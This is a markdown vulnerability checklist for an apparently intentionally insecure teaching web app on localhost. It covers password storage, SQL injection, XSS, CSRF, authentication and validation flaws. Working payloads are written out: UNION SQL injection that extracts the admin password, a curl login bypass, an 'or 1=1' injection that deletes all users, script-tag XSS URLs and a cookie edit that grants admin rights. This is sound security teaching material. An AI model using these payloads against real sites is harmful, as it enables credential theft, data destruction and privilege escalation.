#Vulnerabilities in the webapp
##Secure password storage


- [ ] The password is not salted to prevent parallell attack and precomputated/rainbow tables.
- [ ] The password is not hashed iteratively with bcrypt/scrypt/PBKDF2.
- [ ] Need better password policy. Short passwords must be disallowed.
- [ ] Password leak in HTML comment on show user page
	- `http://localhost:8080/user/<username>`
- [ ] Password input field should be type=password.


##SQL injections


- [x] Show user 
	`http://localhost:8080/user/-1%27%20union%20all%20select%201,pass,3,4,5,6,%207%20from%20users%20where%20user=%27admin%27--%20-`
- [x] Bypass login form http://localhost:8080/login</p>
	`curl -v localhost:8080/login --data "pass=pwned&amp;user=foobar' UNION ALL SELECT -1,-1,'5e93de3efa544e85dcd6311732d28f95',-1,-1,-1,-1-- -"`
- [x] Admin user delete. Drop all users with
		`http://localhost:8080/admin/delete/foobar' or 1=1-- -`
- [x] Adding a movie review.
- [x] Edit user form.


##XSS

- [x] Reflected on, show user 
	`http://localhost:8080/user/foobar%3Cscript%3Ealert%281337%29%3C%2Fscript%3E`
(latest chromium's XSS auditor actually blocks this)
- [x] Reflected on logout message
	- `http://localhost:8080/?msg=aa%3Cscript%3Ealert%287%29%3C/script%3E`
- [x] Reflected on create user form on username field.
- [x] Persistent on show user. Email, bio and age. `http://localhost:8080/user/<username>`
- [x] Reflected on admin delete user page `http://localhost:8080/admin/delete/foobar%3Cscript%3Ealert%281337%29%3C%2Fscript%3E`


##CSRF

- [ ] Login form
- [ ] Edit user form
- [ ] Logout link `http://localhost.no:8080/logout`
- [ ] Create user form
- [ ] Delete user `http://localhost:8080/admin/delete/bob`
- [ ] Add movie review `http://localhost:8080/movies/8`

##Authentication mechanisms

- [ ] Session id in cookie is not regenerated after login to prevent session fixation
- [ ] Timing attack on the hash comparison because equals operator is used.
- [ ] Cookie tampering allows normal users to become admin. On http://localhost:8080/admin with
	- `document.cookie='isadmin=yes'`;
- [ ] Missing access control on the actual delete on `http://localhost:8080/admin/delete/<username>`


##Data validation

- [ ] Username can be arbitrarily long.
	- `a=$(php -r 'print str_repeat("A", 1000);')
	curl 'http://localhost:8080/user/new' --data "user=$a&amp;pass=&amp;submit=Create+new+user"`


#General other stuff

- [ ] The webapp should be served entirely over TLS. All requests towards HTTP should redirect to HTTPS. HSTS and secure cookie flag should be on. This requires additional hassle with configuration so students do not have to actually configure TLS. But it should be mentioned.
- [ ] Missing throttling and IP bans on excessive requests towards forms.
- [ ] The Slim debug variable should be set to false to minimize leakage of useful info, (e.g. system paths and technology stack).
